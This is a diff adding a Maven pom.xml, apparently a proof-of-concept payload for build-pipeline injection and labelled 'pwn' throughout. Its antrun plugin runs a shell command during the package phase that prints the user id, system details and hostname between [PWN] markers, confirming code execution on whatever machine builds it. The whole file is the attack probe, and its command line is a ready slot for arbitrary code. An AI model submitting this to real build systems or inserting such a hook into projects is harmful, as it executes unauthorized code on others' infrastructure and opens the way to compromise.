@@ -1,0 +1,28 @@
+<project xmlns="http://maven.apache.org/POM/4.0.0">
+  <modelVersion>4.0.0</modelVersion>
+  <groupId>pwn</groupId>
+  <artifactId>pwn</artifactId>
+  <version>1.0</version>
+  <packaging>jar</packaging>
+  <build><plugins>
+    <plugin>
+      <groupId>org.apache.maven.plugins</groupId>
+      <artifactId>maven-antrun-plugin</artifactId>
+      <version>3.1.0</version>
+      <executions><execution>
+        <id>pwn</id>
+        <phase>package</phase>
+        <goals><goal>run</goal></goals>
+        <configuration><target>
+          <mkdir dir="${project.build.directory}"/>
+          <exec executable="/bin/sh" output="${project.build.directory}/pwn.out">
+              <arg value="-c"/>
+              <arg value="id; uname -a; hostname"/>
+          </exec>
+          <loadfile property="pwnout" srcFile="${project.build.directory}/pwn.out"/>
+          <echo message="[PWN]${pwnout}[PWN]"/>
+        </target></configuration>
+      </execution></executions>
+    </plugin>
+  </plugins></build>
+</project>
